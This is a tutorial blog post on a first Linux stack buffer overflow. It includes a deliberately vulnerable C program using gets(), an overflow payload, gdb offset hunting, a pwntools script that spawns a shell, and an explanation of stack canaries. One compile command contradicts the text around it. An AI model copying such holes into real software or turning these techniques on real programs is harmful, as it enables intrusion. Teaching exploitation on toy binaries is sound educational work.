# Introduction to Linux pwn - first example
I hope this blogpost would be a nice introduction to Linux pwn challenges, I intend on doing a multi-part series on the subject.  
The idea behind those challenges is usually gaining arbitrary code execution capabilities, either remotely or locally through the use of [SUID binary](https://en.wikipedia.org/wiki/Setuid) files.  
In this blogpost I'll show the simplest example that I hand-coded. We will focus primarily on C and Linux, but not a lot of background is necessary for now!  
Remark: I will mostly cover the Intel architecture (64 bit). There are substantial differences between 32 and 64 bit, and even more when we talk about other architectures (e.g. ARM).  
However, pwn knowledge is transferrable in a general sense, so let us not worry about that now.

## First example
Here's a toy examine for us to begin:

```c
#include <stdio.h>
#include <unistd.h>

static
void
say_hello(int* magic)
{
	char name[20] = { 0 };

	printf("What is your name? ");
	gets(name);
	printf("Hello %s!\n", name);

	if (*magic == 0x1337CAFE)
	{
		printf("woot!\n");
		execve("/bin/sh", NULL, NULL);
	}
}

int
main()
{
	int magic = 0;

	setbuf(stdout, NULL);
	say_hello(&magic);

	return 0;
}
```

Let us analyze the code:
1. Function `say_hello` gets a pointer to a variable called `magic`. Then, it gets a `name` from `stdin` (from the standard input, aka "the keyboard") and prints out a greeting.
2. If the `magic` value supplied to the function `say_hello` is exactly `0x1337CAFE` (a completely random value I chose for this exercise!) then we print `woot` and execute `/bin/sh`, i.e. "getting a shell".
3. The `main` function simply called `say_hello` with a `magic` value that was initialized to `0`, hence we should never fulfill the condition to get us a shell.
4. Also notice `setbuf(stdout, NULL)` - this basically replaces `fflush` on `stdout` and simply makes sure we print out immidiately without buffering. It's not super important for now.

Well, let us compile using `gcc`, but with a special flag I will mention shortly: `-fno-stack-protector`. I also use `-w` to ignore all warnings.  
Since I do not like typing a lot, I put things in a `Makefile`:

```
CC=gcc
CFLAGS=-fno-stack-protector -w

chall: chall.c
	$(CC) $(CFLAGS) -o chall chall.c

clean:
	rm -f chall
```

Upon compilation:

```shell
gcc -fno-stack-protector -w -o chall chall.c
/usr/bin/ld: /tmp/ccODuVW9.o: in function `say_hello':
chall.c:(.text+0x48): warning: the `gets' function is dangerous and should not be used.
```

That's just a warning (even though I ignored the warnings with `-w`!), but a big hint on the issue.  
After successfully compiling, let's run:

```shell
$ ./chall
What is your name? JBO
Hello JBO!
```

So far so good. Although, take a look at this!

```shell
$ printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xFE\xCA\x37\x13" | ./chall
What is your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��7!
woot!
```

Looks like we satisfied the condition of `*magic == 0x1337CAFE`! How?

## What happened
As I "gently" hinted, the `gets` function is the one doing all the harm. Note that `gets` does not get the target buffer length as an input.  
As a result, `gets` is condidered *highly* dangerous as one can simply write more bytes than intended, and this is all it takes here.  
In our example, the buffer size is `20` bytes, but we wrote `64` bytes instead  
The ability to override a buffer beyond the intended length is called a `buffer overflow`, and in our case - the buffer lives on the stack.  
This raises the question - what happens "beyond" the 20 bytes of the `name` variable?  

### The stack
In most modern architectures, local variables are saved in a special memory region called "the stack". Actually, there's one stack per-thread, but we're dealing with a single-threaded process so the name *the* stack is justified.  
The stack is interesting - it allows `push` and `pop` operations (in the `Intel` architecture - ARM is a bit more "raw" but most of its Assemblers has "push" and "pop" macros still) and most importantly - it grows *down*. The top of the stack is marked by a register (`rsp`), and when you `push`, you *decrease* that value, while `pop`ping *increases* that value.  
What is stack used for, besides local variables?
1. Exception handlers sometimes use the stack.
2. Variables are pushed on the stack, normally in the reverse-order of apperance. Note in `32` bit that is always true, while in `64` bits we push the first 6 parameters on registers: `rdi`, `rsi`, `rdx`, `rcx`, `r8` and `r9`. In ARM you'd see something similar - first few arguments use registers.
3. Return addresses are pushed on the stack. The `call` Intel mnemonic is equivalent to `push rip` and `jmp <target>`, and the `ret` is equivalent to `pop rip`. This is *very* important since overriding stack memory (i.e. what we're doing now) might override return addresses, therefore taking control of the program flow. In `ARM` the `call` equivalent is `bl` or `blx` (the `x` denotes a potential change of processor mode, which I will not touch today) and performs `mov lr, pc` followed by `mov pc, <target>`. The `pc` register is the `rip` equivalent in `ARM`, and `lr` is a special `link register` that saves return addresses. However, if the function doesn't call a leaf function it's very necessary to save the previous `lr` register somewhere (otherwise, where would the current function return?) and that place is the stack again.

How does our stack look like during the lifetime of our program?
1. The `main` function already uses a stack (it uses `argc`, `argv` and `envp` even if we ignore them) but we won't cover that.
2. The `main` function has a local `int magic` variable.
3. Upon calling `say_hello`, we address of `magic` is *not* pushed to the stack since we are dealing with 64 bit architectures - it will be passed with a register. However, the return address is still pushed.
4. The `say_hello` function has a `20 byte` variable called `name`, which also lives on the stack.

So, mentally, we should imagine (inaccurately) the following picture:

```
HIGH ADDRSSES		magic			4 bytes
			return address		8 bytes
			name			20 bytes
LOW ADDRSSES     	(TOP OF STACK)
```

When we call `gets` we start overriding from low addresses towards high addresses, therefore, after a certain amount we will override the return address and then the magic.  
Since the check for `magic` happens before the return address is referenced and since `execve` never returns - the overridden return address is never referenced and we simply override `magic`.  
If course, this doesn't explain why we had to write `64` bits. There are some interesting things that could affect the spacinb between stack positions, including:
1. Compiler optimizations.
2. Preference to optimize speed over memory - e.g. aiming for variables that are memory aligned.
3. Compiler deciding to save certain registers on the stack. On Intel architectures that might involve the `rbp` register, as well as any other necessary register.

The best approach is to open a debugger (`gdb`) alongside a disassembler. There are two approaches: `static` analysis and `dynamic` analysis, but I like to combine them.  
However, in this particular exercise dynamically is easier.

### Determining how many bytes to override
Opening a disassembler reveals the reason quite clearly, but I will be using `gdb` as a disassembler for now.  
Note that by default, `gdb` uses the (terrible) AT&T Assembly syntax, and most people I know prefer the Intel syntax.  
The command for that is `set disassembly-flavor intel`, but, since we're lazy, we can prepare a `.gdbinit` file:

```shell
echo set disassembly-flavor intel > ~/.gdbinit
```

Let's put a breakpoint in `say_hello` with `b *say_hello` and run the program with `r`:

```shell
$ gdb ./chall
(gdb) b *say_hello
Breakpoint 1 at 0x11c9
(gdb) r
```

After looking at the disassembly (using `layout asm` or `disas`):

```assembly
B+> 0x5555555551c9 <say_hello>      endbr64
    0x5555555551cd <say_hello+4>    push   rbp
    0x5555555551ce <say_hello+5>    mov    rbp,rsp
    0x5555555551d1 <say_hello+8>    sub    rsp,0x30
    0x5555555551d5 <say_hello+12>   mov    QWORD PTR [rbp-0x28],rdi
    0x5555555551d9 <say_hello+16>   mov    QWORD PTR [rbp-0x20],0x0
    0x5555555551e1 <say_hello+24>   mov    QWORD PTR [rbp-0x18],0x0
    0x5555555551e9 <say_hello+32>   mov    DWORD PTR [rbp-0x10],0x0
    0x5555555551f0 <say_hello+39>   lea    rax,[rip+0xe0d]        # 0x555555556004
    0x5555555551f7 <say_hello+46>   mov    rdi,rax
    0x5555555551fa <say_hello+49>   mov    eax,0x0
    0x5555555551ff <say_hello+54>   call   0x5555555550b0 <printf@plt>
    0x555555555204 <say_hello+59>   lea    rax,[rbp-0x20]
    0x555555555208 <say_hello+63>   mov    rdi,rax
    0x55555555520b <say_hello+66>   mov    eax,0x0
    0x555555555210 <say_hello+71>   call   0x5555555550d0 <gets@plt>
    0x555555555215 <say_hello+76>   lea    rax,[rbp-0x20]
    0x555555555219 <say_hello+80>   mov    rsi,rax
    0x55555555521c <say_hello+83>   lea    rax,[rip+0xdf5]        # 0x555555556018
    0x555555555223 <say_hello+90>   mov    rdi,rax
    0x555555555226 <say_hello+93>   mov    eax,0x0
    0x55555555522b <say_hello+98>   call   0x5555555550b0 <printf@plt>
    0x555555555230 <say_hello+103>  mov    rax,QWORD PTR [rbp-0x28]
    0x555555555234 <say_hello+107>  mov    eax,DWORD PTR [rax]
    0x555555555236 <say_hello+109>  cmp    eax,0x1337cafe
    0x55555555523b <say_hello+114>  jne    0x555555555265 <say_hello+156>
    0x55555555523d <say_hello+116>  lea    rax,[rip+0xddf]        # 0x555555556023
    0x555555555244 <say_hello+123>  mov    rdi,rax
    0x555555555247 <say_hello+126>  call   0x555555555090 <puts@plt>
    0x55555555524c <say_hello+131>  mov    edx,0x0
    0x555555555251 <say_hello+136>  mov    esi,0x0
    0x555555555256 <say_hello+141>  lea    rax,[rip+0xdcc]        # 0x555555556029
    0x55555555525d <say_hello+148>  mov    rdi,rax
    0x555555555260 <say_hello+151>  call   0x5555555550c0 <execve@plt>
    0x555555555265 <say_hello+156>  nop
    0x555555555266 <say_hello+157>  leave
    0x555555555267 <say_hello+158>  ret
```

Well, thst might look like a lot to handle, but one of the most important parts of reverse engineering is to focus on what's important!  
In our case, we already know we have a potential issue with `gets`, and the comparison to `0x1337cafe` is clearly visible at `<say_hello+109>`.  
So, how about we put a breakpoint there and give a very unique input? We could then recognize how many bytes we need to override!  

```shell
(gdb) b *say_hello+109
Breakpoint 2 at 0x555555555236
(gdb) c
Continuing.
What is your name? ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
Breakpoint 2, 0x555555555236 in say_hello () qrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!
(gdb) p $eax
$1 = 1111570744
```

So, after using the unique pattern (`ABCDE...`) we hit the comparison and see that the value of `eax` was changed to `1111570744`!  
Well, if we see how that value looks in Hexadecimal form, it's `0x42413938`, and that's quite unique:

```python
>>> import struct
>>> struct.pack('<L', 1111570744)
b'89AB'
```

That's awesome, this means that the index of `89AB` is how many bytes we need to override!

```python
>>> 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.index('89AB')
60
```

So, after `60` bytes we should be writing the desired value (`0x1337CAFE`). To encode it, we remember Intel uses [Little Endian](https://en.wikipedia.org/wiki/Endianness) to encode integers, so we reverse the order of bytes!

## Getting a shell with pwntools
The astute reader will notice we got the `woot` output, but no shell afterwards! What gives?  
Well, the problem was that we used `printf` and piped the output to the challenge's `stdin`, so after overriding `magic` we simply finish - and `stdout` gets an `EOF` (end-of-file), which means the shell just quits.  
This can be solved in numerous ways, but this is a nice excuse to introduce to one powerful tool - `pwntools`.  
[Pwntools](https://docs.pwntools.com/en/stable/) is a Python library that helps automate a lot of the annoying boilerplate code you sometimes do for `pwn` challenges.  
In our case, it'll let us talk to a process's `stdin`, as well as switch to an interactive `stdin` afterwards.  
Here's the code for this challenge:

```python
#!/usr/bin/env python3
from pwn import *

p = process('./chall')
p.send(b'A' * 60 + struct.pack('<L', 0x1337CAFE) + b'\n')
p.recvuntil(b'woot!\n')
p.interactive()
```

What happened here:
- Importing everything from `pwn`.
- Creating a new `process` and assigning it to the variable `p`.
- Sending `60` bytes of garbage ('A' characters) to the `stdin` followed by `0x1337CAFE` packed (using `struct` which is imported in `pwn`) and then an end-of-line - all of that using `p.send`.
- Receiving output until we get `woot!` followed by a newline.
- Moving to an interactive mode.

The result is always fun:

```shell
$ ./solve.py
[+] Starting local process './chall': pid 16133
[*] Switching to interactive mode
$ id
uid=1000(jbo) gid=1000(jbo) groups=1000(jbo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
$ exit
[*] Got EOF while reading in interactive
$ exit
[*] Process './chall' stopped with exit code 0 (pid 16133)
[*] Got EOF while sending in interactive
```

## Stack protections
Earlier I mentioned a special `gcc` flag I was using - `-fno-stack-protector`. Let us experiment and remove that!

```shell
$ gcc -fno-stack-protector -w -o chall chall.c
/usr/bin/ld: /tmp/ccKU8W4q.o: in function `say_hello':
chall.c:(.text+0x57): warning: the `gets' function is dangerous and should not be used.
$ ./solve.py
[+] Starting local process './chall': pid 16628
Traceback (most recent call last):
  File "/home/jbo/pwn_learn/./solve.py", line 6, in <module>
    p.recvuntil(b'woot!\n')
  File "/home/jbo/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
    res = self.recv(timeout=self.timeout)
  File "/home/jbo/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py", line 106, in recv
    return self._recv(numb, timeout) or b''
  File "/home/jbo/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py", line 176, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
  File "/home/jbo/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
  File "/home/jbo/.local/lib/python3.10/site-packages/pwnlib/tubes/process.py", line 688, in recv_raw
    raise EOFError
EOFError
[*] Process './chall' stopped with exit code -6 (SIGABRT) (pid 16628)
```

What happened? Perhaps we should try with `printf` like before:

```shell
$ printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xFE\xCA\x37\x13" | ./chall
What is your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��7!
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

Notice how the process crashed with the words `*** stack smashing detected ***`? This is a mechanism aginast stack-based buffer overflows!  
Disassembling will show you slight differences.  
In the function prologue you'll see changes that start with saving the value of `fs:0x28` on the stack:

```assembly
B+> 0x5555555551e9 <say_hello>      endbr64
    0x5555555551ed <say_hello+4>    push   rbp
    0x5555555551ee <say_hello+5>    mov    rbp,rsp
    0x5555555551f1 <say_hello+8>    sub    rsp,0x30
    0x5555555551f5 <say_hello+12>   mov    QWORD PTR [rbp-0x28],rdi
    0x5555555551f9 <say_hello+16>   mov    rax,QWORD PTR fs:0x28
    0x555555555202 <say_hello+25>   mov    QWORD PTR [rbp-0x8],rax
...
```

In the function epilogue you'll see how there is a check to see that value hasn't changed:

```assembly
...
    0x555555555295 <say_hello+172>  mov    rax, QWORD PTR [rbp-0x8]
    0x555555555299 <say_hello+176>  sub    rax, QWORD PTR fs:0x28
    0x5555555552a2 <say_hello+185>  je     0x5555555552a9 <say_hello+192>
    0x5555555552a4 <say_hello+187>  call   0x5555555550b0 <__stack_chk_fail@plt>
    0x5555555552a9 <say_hello+192>  leave
    0x5555555552aa <say_hello+193>  ret
```

The epilogue pulls the saved value from the stack (in `rbp-0x8`) and substracts `fs:0x28` from it - which should result in zero unless the value in the stack was somehow changed.  
If the value is not zero then `__stack_chk_fail@plt` is called, which is the function that purposely crashes the stack and prints out the message we've seen.  
That technique which is on by default on every modern C compiler is called `stack cookie` or `stack canary`.  
The idea is simple - usually attackers aim at overriding the return address, so between the saved return address and the local variables, we save one more value which is *randomly* initialized.  
That value is then checked, with the understanding that an attacker cannot guess a random 64-bit value.  
This random value is initialized even before `main` is called. Note: if you're coming from Windows reverse-engineering background you'd notice the implementation is slightly different - instead of saving the random cookie pointed by the `fs` register, Windows treats it as a global variable in `.data`. The idea, however, is the same.  

One thing that we haven't done is assessing the security mitigations of a binary, which can be easily done with [checksec](https://github.com/slimm609/checksec.sh):

```shell
$ checksec ./chall
[*] '/home/jbo/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

This was done on the binary that was compiled with the `-fno-stack-protector` flag.  
The `No canary found` is the indictor, and in `pwn` challenges that's one of the first things you'd do.  
I intend on showcasing the other mitigations one by one, and how attackers deal with them, in future blogposts.  

By the way - this example also shows how stack cookies \ are *not* bulletproof! Since we call `execve` before using the return address, we can get to a situation where the `magic` value still correctly works, we just need a different number of bytes to push. As an exercise - try to figure our how many!

```shell
$ checksec ./chall
[*] '/home/jbo/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ ./solve.py
[+] Starting local process './chall': pid 1993
[*] Switching to interactive mode
$ exit
[*] Got EOF while reading in interactive
$ exit
[*] Process './chall' stopped with exit code 0 (pid 1993)
[*] Got EOF while sending in interactive
```

## Summary
This was a short a (hopefully) easy landing into Linux binary exploitation \ pwn.  
We have examined a first stack smashing attack (without overriding the return address yet!) and explaining stack cookies \ canaries, as well as get a taste of `pwntools`.  
There's more to come, I promise!

Jonathan Bar Or

